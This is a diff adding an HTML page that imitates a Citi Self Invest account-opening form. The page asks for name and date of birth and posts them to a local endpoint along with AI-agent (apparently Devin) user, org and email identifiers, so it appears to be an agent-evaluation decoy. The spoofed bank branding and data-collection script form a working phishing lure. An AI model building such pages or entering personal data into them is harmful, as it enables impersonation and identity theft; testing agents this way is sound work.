@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Citi&reg; Self Invest - Open an Account | Citi.com</title>
+  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/1/1b/Citi.svg">
+  <style>
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      font-size: 15px;
+      color: #333;
+      background: #fff;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    a { color: #056dae; text-decoration: none; }
+    a:hover { text-decoration: underline; }
+
+    .wrap { max-width: 1280px; margin: 0 auto; padding: 0 32px; }
+
+    /* ---------- Top header ---------- */
+    .top-header { background: #fff; }
+    .top-header .wrap { display: flex; align-items: center; justify-content: space-between; height: 64px; }
+    .top-header .logo img { height: 34px; display: block; }
+    .top-utils { display: flex; gap: 34px; }
+    .top-util {
+      display: flex; flex-direction: column; align-items: center; gap: 4px;
+      font-size: 10px; letter-spacing: 0.8px; color: #333; text-transform: uppercase;
+    }
+    .top-util svg { width: 20px; height: 20px; stroke: #333; fill: none; stroke-width: 1.6; }
+
+    /* ---------- Main nav ---------- */
+    .main-nav { background: #eef3f8; }
+    .main-nav .wrap { display: flex; align-items: center; height: 48px; gap: 30px; }
+    .main-nav a { color: #333; font-size: 14px; }
+    .main-nav a.cta { font-weight: 500; }
+    .main-nav a.cta::after { content: ' \203A'; color: #056dae; font-size: 16px; }
+    .main-nav .spacer { flex: 1; }
+    .main-nav .help { display: inline-flex; align-items: center; gap: 8px; color: #333; }
+    .main-nav .help svg { width: 16px; height: 16px; stroke: #056dae; fill: none; stroke-width: 1.8; }
+    .main-nav .signon { font-weight: 500; }
+
+    /* ---------- Application layout ---------- */
+    .app-shell { background: #f6f7f8; padding: 34px 0 70px; }
+    .app-grid { display: flex; gap: 46px; align-items: flex-start; }
+
+    /* ---------- Steps rail ---------- */
+    .steps-card { flex: 0 0 240px; background: #fff; box-shadow: 0 1px 4px rgba(0, 0, 0, 0.12); }
+    .steps-card img { width: 100%; height: 120px; object-fit: cover; display: block; }
+    .steps-card h2 {
+      font-size: 22px; font-weight: 400; margin: 0; padding: 16px 18px 12px;
+      border-bottom: 1px solid #e3e6e8;
+    }
+    .steps-list { list-style: none; margin: 0; padding: 0 0 8px; }
+    .steps-list li {
+      font-size: 11.5px; letter-spacing: 0.6px; text-transform: uppercase;
+      padding: 13px 18px; color: #333; border-bottom: 1px solid #f0f2f3;
+    }
+    .steps-list li.active { background: #1c6a9e; color: #fff; font-weight: 700; }
+    .help-note { margin-top: 18px; font-size: 13px; line-height: 19px; padding: 0 2px; }
+    .help-note .phone { color: #056dae; }
+    .help-note .fine { color: #333; font-size: 12.5px; margin-top: 2px; }
+
+    /* ---------- Form panel ---------- */
+    .form-panel { flex: 1; background: #fff; box-shadow: 0 1px 4px rgba(0, 0, 0, 0.12); padding: 28px 40px 46px; }
+    .panel-topline { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #e3e6e8; padding-bottom: 12px; }
+    .product-eyebrow { color: #056dae; font-size: 14px; font-weight: 700; letter-spacing: 1.2px; }
+    .secure-tag { font-size: 11px; font-weight: 700; color: #333; display: inline-flex; align-items: center; gap: 5px; }
+    .secure-tag svg { width: 12px; height: 12px; fill: #333; }
+
+    h1 { font-size: 38px; font-weight: 300; margin: 26px 0 24px; color: #1a1a1a; }
+
+    .know-block h3 { font-size: 16px; font-weight: 700; margin: 0 0 12px; }
+    .know-block ul { margin: 0 0 8px; padding-left: 22px; }
+    .know-block li { font-size: 14.5px; line-height: 22px; margin-bottom: 10px; }
+
+    .section-head {
+      font-size: 17px; font-weight: 700; letter-spacing: 0.4px; margin: 34px 0 0;
+      padding-bottom: 12px; border-bottom: 1px solid #d8dcdf; color: #1a1a1a;
+    }
+
+    .field-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 26px 56px; margin-top: 30px; max-width: 780px; }
+    .field label { display: block; font-size: 14px; color: #333; margin-bottom: 8px; }
+    .field input {
+      width: 100%; padding: 12px 12px; font-size: 15px; font-family: inherit; color: #1a1a1a;
+      border: 1px solid #767676; border-radius: 3px; background: #fff;
+    }
+    .field input:focus { outline: 2px solid #056dae; outline-offset: -1px; border-color: #056dae; }
+    .field .field-error { display: none; margin-top: 6px; font-size: 12.5px; color: #cc1e1e; }
+    .field .field-error::before { content: '\26A0 '; }
+    .field.invalid input { border: 2px solid #cc1e1e; }
+    .field.invalid .field-error { display: block; }
+
+    .consent-block { max-width: 820px; margin-top: 34px; }
+    .consent-block h4 { font-size: 14.5px; font-weight: 700; margin: 0 0 14px; line-height: 21px; }
+    .consent-block p { font-size: 14px; line-height: 21px; margin: 0 0 14px; color: #333; }
+
+    /* ---------- Error / success panels ---------- */
+    .app-error {
+      display: none; margin: 26px 0 0; border: 1px solid #cc1e1e; border-left-width: 5px;
+      background: #fdf3f3; padding: 14px 16px; max-width: 820px;
+    }
+    .app-error.show { display: block; }
+    .app-error .title { font-size: 14px; font-weight: 700; color: #a31515; margin-bottom: 6px; }
+    .app-error .msg { font-size: 13px; line-height: 19px; color: #3d3d3d; margin-bottom: 8px; }
+    .app-error .tech {
+      font-family: 'SFMono-Regular', Consolas, 'Liberation Mono', monospace;
+      font-size: 11.5px; line-height: 17px; color: #6b2b2b; background: #f6e7e8;
+      padding: 8px 10px; word-break: break-word;
+    }
+    .app-ok {
+      display: none; margin: 26px 0 0; border: 1px solid #1a7f37; border-left-width: 5px;
+      background: #f1f8f3; padding: 12px 16px; max-width: 820px; font-size: 13px; line-height: 19px;
+    }
+    .app-ok.show { display: block; }
+
+    .btn-continue {
+      margin-top: 34px; background: #056dae; color: #fff; font-family: inherit;
+      font-size: 16px; font-weight: 500; padding: 14px 54px; border: none; border-radius: 4px;
+      cursor: pointer; display: inline-block;
+    }
+    .btn-continue:hover { background: #045a90; }
+
+    /* ---------- Footer ---------- */
+    footer { background: #fff; border-top: 1px solid #e0e0e0; padding: 26px 0 34px; }
+    .foot-links { display: flex; flex-wrap: wrap; gap: 10px 26px; font-size: 12.5px; margin-bottom: 16px; }
+    .foot-legal { font-size: 12px; color: #555; line-height: 18px; }
+
+    @media (max-width: 900px) {
+      .app-grid { flex-direction: column; }
+      .steps-card { flex: none; width: 100%; }
+      .field-grid { grid-template-columns: 1fr; }
+      .main-nav .wrap { overflow-x: auto; }
+    }
+  </style>
+</head>
+<body>
+
+<header class="top-header">
+  <div class="wrap">
+    <a class="logo" href="#">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/1/1b/Citi.svg" alt="Citi">
+    </a>
+    <div class="top-utils">
+      <a class="top-util" href="#">
+        <svg viewBox="0 0 24 24"><path d="M12 21s-7-5.5-7-11a7 7 0 1 1 14 0c0 5.5-7 11-7 11z"/><circle cx="12" cy="10" r="2.5"/></svg>
+        ATM / Branch
+      </a>
+      <a class="top-util" href="#">
+        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3c2.5 2.5 3.8 5.6 3.8 9S14.5 18.5 12 21c-2.5-2.5-3.8-5.6-3.8-9S9.5 5.5 12 3z"/></svg>
+        Espa&ntilde;ol
+      </a>
+    </div>
+  </div>
+</header>
+
+<nav class="main-nav">
+  <div class="wrap">
+    <a href="#">Credit Cards</a>
+    <a href="#">Banking</a>
+    <a href="#">Lending</a>
+    <a href="#">Investing</a>
+    <a href="#">Wealth Management</a>
+    <a class="cta" href="#">Open an Account</a>
+    <div class="spacer"></div>
+    <a class="help" href="#">
+      <svg viewBox="0 0 24 24"><circle cx="10.5" cy="10.5" r="7"/><path d="M15.5 15.5 21 21"/></svg>
+      How can we help?
+    </a>
+    <a class="signon" href="#">Sign On</a>
+  </div>
+</nav>
+
+<div class="app-shell">
+  <div class="wrap">
+    <div class="app-grid">
+
+      <aside>
+        <div class="steps-card">
+          <img src="https://images.unsplash.com/photo-1609220136736-443140cffec6?w=600&q=80" alt="Family planning their finances at home">
+          <h2>Steps</h2>
+          <ol class="steps-list">
+            <li class="active">1. Personal Information</li>
+            <li>2. Protect Your Account</li>
+            <li>3. Profile Details</li>
+            <li>4. Employment &amp; Income</li>
+            <li>5. Agreements &amp; Disclosures</li>
+          </ol>
+        </div>
+        <div class="help-note">
+          Need more help? <a class="phone" href="tel:18776934543">1-877-693-4543</a>
+          <a class="phone" href="#">(TTY: We accept 711 or other Relay Service.)</a>
+          <div class="fine">We&rsquo;re available weekdays, 8 AM to 7 PM ET.</div>
+        </div>
+      </aside>
+
+      <main class="form-panel">
+        <div class="panel-topline">
+          <span class="product-eyebrow">CITI&reg; SELF INVEST</span>
+          <span class="secure-tag">
+            <svg viewBox="0 0 24 24"><path d="M17 9V7a5 5 0 0 0-10 0v2H5v13h14V9h-2zm-8-2a3 3 0 0 1 6 0v2H9V7z"/></svg>
+            Secure Application
+          </span>
+        </div>
+
+        <h1>We&rsquo;re glad you&rsquo;re here!</h1>
+
+        <div class="know-block">
+          <h3>Things to know before you apply</h3>
+          <ul>
+            <li>You&rsquo;ll need to agree to receive paperless statements and notices and accept the Paperless Terms &amp;
+              Conditions before submitting your application.</li>
+            <li>We&rsquo;ll also have you set up a User ID and password for online access to your account. You should never
+              share your online banking credentials with a third party. Citibank will never ask you for your User ID or
+              password.</li>
+          </ul>
+        </div>
+
+        <div class="section-head">YOUR PERSONAL INFORMATION</div>
+
+        <div class="field-grid">
+          <div class="field" id="field-first-name">
+            <label for="first-name">First Name</label>
+            <input type="text" id="first-name" name="firstName" autocomplete="given-name">
+            <div class="field-error">First name is required.</div>
+          </div>
+          <div class="field" id="field-last-name">
+            <label for="last-name">Last Name</label>
+            <input type="text" id="last-name" name="lastName" autocomplete="family-name">
+            <div class="field-error">Last name is required.</div>
+          </div>
+          <div class="field" id="field-dob">
+            <label for="dob">Date of Birth (MM/DD/YYYY)</label>
+            <input type="text" id="dob" name="dateOfBirth" inputmode="numeric" autocomplete="bday">
+            <div class="field-error">Date of birth is required.</div>
+          </div>
+        </div>
+
+        <div class="consent-block">
+          <h4>Authorization for the Social Security Administration to Disclose Your Social Security Number
+            Verification</h4>
+          <p>You authorize the Social Security Administration (SSA) to verify and disclose to Citibank, N.A. and its
+            affiliates including Citigroup Global Markets Inc. through Early Warning System LLC for the purpose of this
+            transaction whether the name, Social Security Number (SSN) and date of birth you have submitted matches
+            information in SSA records. Your consent is for a one-time validation within the next 90 days.</p>
+          <p>By clicking the Continue button, you are signing the consent for SSA to disclose your SSN verification to
+            Citibank, N.A. and its affiliates including Citigroup Global Markets Inc. You agree that your electronic
+            signature has the same legal meaning and validity as your handwritten signature.</p>
+          <p><strong>Note:</strong> Please review your personal information before proceeding. You will not be able to
+            edit your information after selecting Continue.</p>
+        </div>
+
+        <div class="app-error" id="apply-error" role="alert" aria-live="assertive">
+          <div class="title">We&rsquo;re unable to continue your application right now</div>
+          <div class="msg">Our account opening service is temporarily unavailable. Please try again in a few minutes or
+            call us at 1-877-693-4543 for assistance.</div>
+          <div class="tech" id="apply-error-tech"></div>
+        </div>
+        <div class="app-ok" id="apply-ok" role="status"></div>
+
+        <button class="btn-continue" type="button" data-cta>Continue</button>
+      </main>
+
+    </div>
+  </div>
+</div>
+
+<footer>
+  <div class="wrap">
+    <div class="foot-links">
+      <a href="#">Terms &amp; Conditions</a>
+      <a href="#">Privacy</a>
+      <a href="#">Notice at Collection</a>
+      <a href="#">Accessibility</a>
+      <a href="#">Security Center</a>
+    </div>
+    <div class="foot-legal">
+      Citi Self Invest accounts are offered through Citigroup Global Markets Inc. (&ldquo;CGMI&rdquo;), member SIPC.
+      Investment products are Not FDIC Insured &middot; Not a Bank Deposit &middot; Not Bank Guaranteed &middot; May Lose
+      Value. &copy; 2026 Citigroup Inc. Citi, Citi with Arc Design and other marks used herein are service marks of
+      Citigroup Inc. or its affiliates, used and registered throughout the world.
+    </div>
+  </div>
+</footer>
+
+<script>
+  var DEVIN_USER_ID = 'clerk-user_2eG9PmvFhmV7fNu7TNuSRGeGPpV';
+  var DEVIN_ORG_ID = 'org_69IXJFLrljx8zSAw';
+
+  function showApplyError(payload) {
+    var tech = document.getElementById('apply-error-tech');
+    tech.textContent = (payload.errorClass || 'Error') + ': ' + (payload.error || 'Unknown error')
+      + '\n' + (payload.code || 'APPLICATION_STEP_FAILED')
+      + ' \u00b7 Reference ID: ' + (payload.requestId || 'unavailable');
+    var panel = document.getElementById('apply-error');
+    panel.classList.add('show');
+    panel.scrollIntoView({ behavior: 'smooth', block: 'center' });
+  }
+
+  function showApplyContinued(result) {
+    var ok = document.getElementById('apply-ok');
+    var message = 'Personal information saved \u2014 next step: ' + (result.nextStepLabel || 'Protect Your Account') + '.';
+    if (result.ssaConsent && result.ssaConsent.recorded) {
+      message += ' SSA verification consent recorded (valid for ' + result.ssaConsent.validDays + ' days).';
+    }
+    ok.textContent = message;
+    ok.classList.add('show');
+    ok.scrollIntoView({ behavior: 'smooth', block: 'center' });
+  }
+
+  function submitPersonalInfo(button) {
+    if (button._running) return;
+    button._running = true;
+    var original = button.textContent;
+    button.textContent = 'Submitting\u2026';
+    button.style.pointerEvents = 'none';
+    document.getElementById('apply-error').classList.remove('show');
+    document.getElementById('apply-ok').classList.remove('show');
+
+    fetch('/api/94f4c31f/personal-info', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        productCode: 'SELF-INVEST',
+        firstName: document.getElementById('first-name').value.trim(),
+        lastName: document.getElementById('last-name').value.trim(),
+        dateOfBirth: document.getElementById('dob').value.trim(),
+        channel: 'web',
+        devinUserId: DEVIN_USER_ID,
+        devinOrgId: DEVIN_ORG_ID,
+        devinEmail: localStorage.getItem('devinEmail') || '',
+      }),
+    })
+      .then(function (res) { return res.json().then(function (body) { return { ok: res.ok, body: body }; }); })
+      .then(function (result) {
+        if (!result.ok || result.body.error) showApplyError(result.body);
+        else showApplyContinued(result.body);
+      })
+      .catch(function (err) {
+        showApplyError({ errorClass: 'NetworkError', error: err.message });
+      })
+      .finally(function () {
+        button.textContent = original;
+        button.style.pointerEvents = '';
+        button._running = false;
+      });
+  }
+
+  document.querySelectorAll('[data-cta]').forEach(function (button) {
+    button.addEventListener('click', function (event) {
+      event.preventDefault();
+      submitPersonalInfo(button);
+    });
+  });
+</script>
+</body>
+</html>
